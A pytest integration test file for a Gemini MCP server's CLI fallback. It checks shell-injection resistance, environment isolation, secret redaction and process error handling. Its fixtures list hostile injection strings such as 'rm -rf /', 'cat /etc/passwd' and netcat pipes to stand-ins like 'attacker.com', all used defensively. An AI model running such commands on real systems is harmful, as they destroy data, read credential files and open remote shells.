#!/usr/bin/env python3
"""
Integration tests for CLI fallback logic and command execution
Tests the security of subprocess execution and error handling
"""

import asyncio
import os
import sys
from typing import Any, List
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Import our server components
sys.path.insert(
    0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
)

from gemini_mcp_server import execute_gemini_cli_streaming


class TestCLIFallbackSecurity:
    """Test CLI fallback security measures"""

    @pytest.mark.asyncio
    async def test_no_shell_injection(self) -> None:
        """Test that shell injection is prevented in CLI execution"""

        # Test malicious prompts that could cause shell injection
        malicious_prompts = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test $(whoami)",
            "test `id`",
            "test > /tmp/evil.sh",
        ]

        for malicious_prompt in malicious_prompts:
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_process.pid = 12345
            mock_process.stdout.readline = AsyncMock(return_value=b"")
            mock_process.communicate = AsyncMock(return_value=(b"safe output", b""))

            with patch(
                "asyncio.create_subprocess_exec", return_value=mock_process
            ) as mock_exec:
                with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                    result = await execute_gemini_cli_streaming(
                        malicious_prompt, "gemini_quick_query"
                    )

                    # Verify that create_subprocess_exec was called with individual args
                    # This ensures no shell interpretation of the malicious content
                    call_args = mock_exec.call_args[0]
                    assert call_args == (
                        "gemini",
                        "-m",
                        "gemini-2.5-flash",
                        "-p",
                        malicious_prompt,
                    )

                    # Verify no shell=True was used  # noqa: B602
                    kwargs = mock_exec.call_args[1]
                    assert "shell" not in kwargs or kwargs["shell"] is False

    @pytest.mark.asyncio
    async def test_command_argument_validation(self) -> None:
        """Test that command arguments are properly validated"""

        # Test with invalid model names that could be dangerous
        dangerous_models = [
            "../../../bin/sh",
            "; cat /etc/passwd #",
            "model && rm -rf /",
            "model | nc evil.com 443",
        ]

        for dangerous_model in dangerous_models:
            with patch("gemini_mcp_server.GEMINI_MODELS", {"flash": dangerous_model}):
                result = await execute_gemini_cli_streaming(
                    "test", "gemini_quick_query"
                )

                assert result["success"] is False
                assert "Invalid model name" in result["error"]

    @pytest.mark.asyncio
    async def test_environment_isolation(self) -> None:
        """Test that subprocess runs with minimal environment"""

        mock_process = MagicMock()
        mock_process.returncode = 0
        mock_process.pid = 12345
        mock_process.stdout.readline = AsyncMock(return_value=b"")
        mock_process.communicate = AsyncMock(return_value=(b"output", b""))

        with patch(
            "asyncio.create_subprocess_exec", return_value=mock_process
        ) as mock_exec:
            with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                await execute_gemini_cli_streaming("test", "gemini_quick_query")

                # Verify minimal environment was passed
                kwargs = mock_exec.call_args[1]
                env = kwargs.get("env", {})

                # Should only have PATH, not full environment
                assert "PATH" in env
                # Sensitive variables should not be passed
                assert "HOME" not in env
                assert "USER" not in env


class TestCLIProcessManagement:
    """Test CLI process lifecycle and management"""

    @pytest.mark.asyncio
    async def test_process_timeout_handling(self) -> Any:
        """Test that long-running processes are handled correctly"""

        # Mock a process that times out a few times then completes
        mock_process = MagicMock()
        mock_process.pid = 12345

        # Create a sequence: timeout a few times, then process completes
        timeout_count = 0

        async def mock_readline() -> bytes:
            nonlocal timeout_count
            if timeout_count < 3:
                timeout_count += 1
                raise asyncio.TimeoutError()
            else:
                # Process completes after timeouts
                mock_process.returncode = 0
                return b""  # EOF

        mock_process.stdout.readline = mock_readline
        mock_process.communicate = AsyncMock(return_value=(b"partial output", b""))

        # Initially still running, then completed
        mock_process.returncode = None

        with patch("asyncio.create_subprocess_exec", return_value=mock_process):
            with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                # This should not hang indefinitely
                result = await execute_gemini_cli_streaming(
                    "test", "gemini_quick_query"
                )

                # Should complete even with timeouts
                assert result is not None
                assert result["success"] is True

    @pytest.mark.asyncio
    async def test_process_memory_constraints(self) -> None:
        """Test handling of processes with large output"""

        # Create a very large output to test memory handling
        large_output_lines = [f"Line {i}: {'A' * 1000}\n".encode() for i in range(1000)]
        large_output_lines.append(b"")  # End marker

        mock_process = MagicMock()
        mock_process.returncode = 0
        mock_process.pid = 12345
        mock_process.stdout.readline = AsyncMock(side_effect=large_output_lines)
        mock_process.communicate = AsyncMock(return_value=(b"", b""))

        with patch("asyncio.create_subprocess_exec", return_value=mock_process):
            with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                result = await execute_gemini_cli_streaming(
                    "test", "gemini_quick_query"
                )

                assert result["success"] is True
                # Verify we captured the large output
                assert len(result["output"]) > 100000  # Should be > 100KB

    @pytest.mark.asyncio
    async def test_stderr_error_capture(self) -> None:
        """Test that stderr errors are properly captured and sanitized"""

        mock_process = MagicMock()
        mock_process.returncode = 1
        mock_process.pid = 12345
        mock_process.stdout.readline = AsyncMock(return_value=b"")

        # Simulate stderr with potential sensitive info
        stderr_with_sensitive = (
            b"Error: API key AIzaSyBHJ5X2K9L8M3N4O5P6Q7R8S9T0 invalid"
        )
        mock_process.communicate = AsyncMock(return_value=(b"", stderr_with_sensitive))

        with patch("asyncio.create_subprocess_exec", return_value=mock_process):
            with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                result = await execute_gemini_cli_streaming(
                    "test", "gemini_quick_query"
                )

                assert result["success"] is False
                # Verify sensitive info is not in the error message
                assert "AIzaSyBHJ5X2K9L8M3N4O5P6Q7R8S9T0" not in result["error"]

    @pytest.mark.asyncio
    async def test_concurrent_cli_executions(self) -> None:
        """Test that multiple CLI executions can run concurrently"""

        # Mock multiple processes
        processes = []
        for i in range(3):
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_process.pid = 12345 + i
            mock_process.stdout.readline = AsyncMock(return_value=b"")
            mock_process.communicate = AsyncMock(
                return_value=(f"Output {i}".encode(), b"")
            )
            processes.append(mock_process)

        with patch("asyncio.create_subprocess_exec", side_effect=processes):
            with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                # Run multiple CLI executions concurrently
                tasks = [
                    execute_gemini_cli_streaming(f"test {i}", "gemini_quick_query")
                    for i in range(3)
                ]

                results = await asyncio.gather(*tasks)

                # All should succeed
                assert len(results) == 3
                for i, result in enumerate(results):
                    assert result["success"] is True
                    assert f"Output {i}" in result["output"]


class TestCLIInputValidation:
    """Test CLI input validation and sanitization"""

    @pytest.mark.asyncio
    async def test_prompt_length_validation(self) -> None:
        """Test that overly long prompts are rejected"""

        # Test prompt that exceeds 1MB limit
        very_long_prompt = "A" * 1000001  # Just over 1MB

        result = await execute_gemini_cli_streaming(
            very_long_prompt, "gemini_quick_query"
        )

        assert result["success"] is False
        assert "too large" in result["error"]

    @pytest.mark.asyncio
    async def test_prompt_type_validation(self) -> None:
        """Test that non-string prompts are rejected"""

        invalid_prompts: List[Any] = [None, 123, [], {}, b"bytes"]

        for invalid_prompt in invalid_prompts:
            result = await execute_gemini_cli_streaming(
                invalid_prompt, "gemini_quick_query"
            )

            assert result["success"] is False
            assert "Invalid prompt" in result["error"]

    @pytest.mark.asyncio
    async def test_empty_prompt_handling(self) -> None:
        """Test handling of empty or whitespace-only prompts"""

        empty_prompts = ["", "   ", "\n\n\n", "\t\t"]

        for empty_prompt in empty_prompts:
            result = await execute_gemini_cli_streaming(
                empty_prompt, "gemini_quick_query"
            )

            assert result["success"] is False
            assert "Invalid prompt" in result["error"]


class TestCLIErrorRecovery:
    """Test CLI error recovery and resilience"""

    @pytest.mark.asyncio
    async def test_process_crash_handling(self) -> None:
        """Test handling when CLI process crashes unexpectedly"""

        mock_process = MagicMock()
        mock_process.returncode = -9  # SIGKILL
        mock_process.pid = 12345
        mock_process.stdout.readline = AsyncMock(side_effect=BrokenPipeError)
        mock_process.communicate = AsyncMock(return_value=(b"", b"Process killed"))

        with patch("asyncio.create_subprocess_exec", return_value=mock_process):
            with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                result = await execute_gemini_cli_streaming(
                    "test", "gemini_quick_query"
                )

                assert result["success"] is False
                assert "killed" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_subprocess_exception_handling(self) -> None:
        """Test handling of subprocess creation exceptions"""

        with patch(
            "asyncio.create_subprocess_exec", side_effect=OSError("Command not found")
        ):
            with patch("gemini_mcp_server.GOOGLE_API_KEY", None):

                result = await execute_gemini_cli_streaming(
                    "test", "gemini_quick_query"
                )

                assert result["success"] is False
                assert "Command not found" in result["error"]


if __name__ == "__main__":
    # Run integration tests
    import subprocess
    import sys

    print("Running CLI Fallback Integration Tests...")
    result = subprocess.run(
        [sys.executable, "-m", "pytest", __file__, "-v", "--tb=short"],
        capture_output=True,
        text=True,
    )

    print(result.stdout)
    if result.stderr:
        print("STDERR:", result.stderr)

    sys.exit(result.returncode)
